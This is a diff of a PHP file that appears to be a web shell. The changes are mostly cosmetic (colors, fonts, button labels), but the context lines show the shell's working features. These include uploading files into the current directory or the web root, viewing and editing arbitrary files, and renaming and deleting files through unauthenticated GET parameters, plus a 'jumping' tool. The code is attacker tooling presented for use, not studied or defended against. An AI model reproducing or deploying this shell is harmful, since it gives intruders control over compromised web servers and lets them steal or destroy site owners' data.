@@ -44,7 +44,7 @@ input[type=text], input[type=password],input[type=submit] {background: transpare
 textarea {border: 1px solid #ffffff;width: 100%;height: 400px;padding-left: 5px;margin: 10px auto;resize: none;background: transparent;color: #ffffff;font-family: 'Kelly Slab';font-size: 16px;}
 select {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Kelly Slab';font-size: 16px;}
 .but {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Kelly Slab';font-size: 16px;}
-li a:hover{color: yellow;text-decoration: none;}
+li a:hover{color: lime;text-decoration: none;}
 .th_home, .titulo {color: #00ff00;text-decoration: none;}
 .board {text-align: center;border: 1px solid rgba(255,180,0,0.4);border-radius: 4px;width: 500px;}
 .board p {font-size: 65px;font-family: 'Kelly Slab';color: #fff;text-transform: uppercase;padding: 0;margin: 0;}
@@ -64,7 +64,7 @@ li {
 	display: inline;
 	margin: 5px;
 	padding: 5px;
-        color : #00bfff;
+        color : yellow;
 }
 
 a {
@@ -72,7 +72,7 @@ a {
 }
 
 a:hover {
-	color: yellow;
+	color: lime;
 	text-decoration: underline;
 }
 
@@ -99,7 +99,8 @@ table, th, td {
 }
 
 .th_home {
-	color: #00bfff;
+       font-family: 'Kelly Slab';
+	color: lime;
 }
 
 .td_home, .td_home > a {
@@ -107,7 +108,7 @@ color: white;
 }
 
 .td_home > a:hover {
-	color: yellow;
+	color: lime;
 }
 
 th {
@@ -115,20 +116,38 @@ th {
 }
 
 tr:hover td{
-background: #464646;
+background: #292828;
 }
 
 input[type=text], input[type=password], .input {
 	background: transparent; 
 	color: #ffffff;
-	border: 1px solid #ffffff;
+	border: 1px solid yellow;
 	padding: 3px;
 	font-family: 'Kelly Slab';
-	font-size: 16px;
+        margin-bottom:4px;
 }
 
 input[type=submit] {
-	padding: 2px;}
+	padding:3px;
+        border:1px solid yellow;
+        background-color: transparent;
+        color:white;
+        margin-bottom:4px;
+        font-family: 'Kelly Slab';
+        font-size: 16px;
+}
+
+input[type=file] {
+	padding:1px;
+        border:1px solid yellow;
+        background-color: transparent;
+        color:white;
+        margin-bottom:4px;
+        font-family: 'Kelly Slab';
+        font-size: 15px;
+}
+
 
 input[type=submit]:hover {
 	cursor: pointer;
@@ -136,7 +155,7 @@ input[type=submit]:hover {
 
 input:focus, textarea:focus {
   outline: 0;
-  border-color: #ffffff;
+  border-color: yellow;
 }
 
 textarea {
@@ -176,6 +195,7 @@ function color($bold = 1, $colorid = null, $string = null) {
 			"<font color='yellow'>",	# 2 yellow
 			"<font color='white'>",	# 3 white
 			"<font color='gold'>",	# 4 gold
+                        "<font color='lime'>",	# 5 lime
 		);
 
 	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
@@ -294,7 +314,7 @@ function hdd() {
 }
 
 function writeable($path, $perms) {
-	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
+	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 5, $perms);
 }
 
 function perms($path) {
@@ -637,7 +657,7 @@ function tools($toolsname, $args = null) {
 		if($_POST['upload']) {
 			if($_POST['uploadtype'] === '1') {
 				if(@copy($_FILES['file']['tmp_name'], path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
-					$act = color(1, 4, "Uploaded!")." at ".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."";
+					$act = color(1, 5, "Uploaded Successful !!")." at ".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."";
 				} 
 				else {
 					$act = color(1, 1, "Failed to upload file!");
@@ -648,7 +668,7 @@ function tools($toolsname, $args = null) {
 				$web = $_SERVER['HTTP_HOST'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
 				if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
 					if(@copy($_FILES['file']['tmp_name'], $root)) {
-						$act = color(1, 4, "Uploaded!")." at $root -> <a href='http://$web' target='_blank'>$web</a>";
+						$act = color(1, 5, "Uploaded Successful !!")." at $root -> <a href='http://$web' target='_blank'>$web</a>";
 					} 
 					else {
 						$act = color(1, 1, "Failed to upload file!");
@@ -659,12 +679,12 @@ function tools($toolsname, $args = null) {
 				}
 			}
 		}
-		print "Upload File: $act
-			  <form method='post' enctype='multipart/form-data'>
+		print "<form method='post' enctype='multipart/form-data'>
 			  <input type='radio' name='uploadtype' value='1' checked>current_dir [ ".writeable(path(), "Writeable")." ] 
 			  <input type='radio' name='uploadtype' value='2'>document_root [ ".writeable($_SERVER['DOCUMENT_ROOT'], "Writeable")." ]<br></i>
+                          Upload File: $act<br>
 			  <input type='file' name='file'>
-			  <input type='submit' value='upload' name='upload'>
+			  <input type='submit' value='Upload' name='upload'>
 			  </form>";
 	}
 	elseif($toolsname === "jumping") {
@@ -1687,7 +1707,7 @@ function action() {
 		} 
 		elseif($_GET['act'] === 'view') {
 			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
-			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
+			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>View</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>Edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>Rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>Download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>Delete</a> ]<br>";
 			print "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
 		} 
 		elseif($_GET['act'] === 'edit') {
@@ -1703,11 +1723,11 @@ function action() {
 			}
 
 			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
-			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
+			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>View</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>Edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>Rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>Download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>Delete</a> ]<br>";
 			print "<form method='post'>
 			<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
-			<input type='submit' class='input' value='SAVE' name='save' style='width: 500px;'>
-			</form>";
+			<input type='submit' class='input' value='Save' name='save' style='width: 500px;'>
+			</form><br>";
 		} 
 		elseif($_GET['act'] === 'rename') {
 			if($_POST['save']) {
@@ -1722,11 +1742,11 @@ function action() {
 			}
 
 			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
-			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
+			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>View</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>Edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>Rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>Download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>Delete</a> ]<br>";
 			print "<form method='post'>
 			<input type='text' value='".basename($_GET['file'])."' name='filename' style='width: 450px;' height='10'>
-			<input type='submit' class='input' name='save' value='RENAME'>
-			</form>";
+			<input type='submit' class='input' name='save' value='Rename'>
+			</form><br>";
 		}
 		elseif($_GET['act'] === 'delete') {
 			$delete = unlink($_GET['file']);
